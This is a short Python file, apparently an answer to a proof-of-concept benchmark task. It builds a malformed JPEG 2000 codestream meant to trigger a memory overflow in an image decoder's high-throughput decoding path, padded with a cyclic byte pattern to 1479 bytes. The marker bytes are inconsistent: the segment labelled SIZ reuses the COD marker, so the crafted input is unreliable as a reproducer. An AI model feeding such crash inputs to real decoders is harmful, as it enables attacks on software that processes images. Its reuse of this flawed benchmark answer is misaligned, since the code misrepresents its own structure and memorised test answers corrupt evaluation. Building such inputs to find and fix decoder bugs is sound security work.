import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\xff\x4f'  # SOC
        # SIZ marker for part 2 compatible, small image but large tile/cb to potentially overflow
        poc += b'\xff\x52\x00\x2b\xff\x90\x00\x00\x00\x40\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\x00\x00\x00\x00\x01\x07\x01\x01'
        # COD with HT coding
        poc += b'\xff\x53\x00\x05\x02\x00\x01\x00\x01'
        # QCD default
        poc += b'\xff\x5c\x00\x01\x00'
        # SOT for tile 0
        poc += b'\xff\x90\x00\x0a\x00\x00\x00\x00\x00\x00\x01'
        # SOD
        poc += b'\xff\x93'
        # Add cyclic pattern for the rest to reach 1479 bytes, to potentially trigger during decoding
        current_len = len(poc)
        remaining = 1479 - current_len
        cyclic = bytearray()
        for i in range(remaining):
            cyclic.append((i % 256))
        poc += bytes(cyclic)
        return poc
